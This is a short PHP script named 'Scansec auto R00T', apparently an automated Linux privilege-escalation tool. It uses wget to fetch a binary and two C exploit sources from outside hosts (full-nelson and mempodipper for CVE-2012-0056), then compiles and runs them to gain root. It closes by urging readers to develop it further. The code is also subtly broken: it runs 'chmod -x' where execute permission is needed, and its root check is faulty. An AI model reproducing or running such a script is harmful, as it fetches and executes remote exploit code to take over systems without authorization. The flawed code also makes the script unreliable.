#!/usr/bin/php
<?php
echo "Scansec auto R00T - Abraxas \n";
sleep(3);
$uname = system("uname -a");
$root = "uid=0";


echo "fetching Ubuntu PAM MOTD local root\n";
$wget = exec("wget http://perlesbleues.com/language/fr-FR/a.out");

exec("chmod -x a.out");
exec("./a.out");
$id = exec("id root");

if ($id == $root ) {
    echo "r00ted";
    exit(0);
}

elseif ($id == null) {
    echo "Failed";
}

echo "Linux Kernel <= 2.6.37 local privilege escalation";

system("wget http://vulnfactory.org/exploits/full-nelson.c");
system("gcc full-nelson.c -o nelson");
system("chmod -x nelson");
system("./nelson");

echo "Linux Local Root => 2.6.39 (32-bit & 64-bit)";
system("wget http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c ");
system("gcc mempodipper.c -o mempo");
system("chmod -x mempo");
system("./mempo");


#This is not fully developed, Develope it for more capabilities!

?>
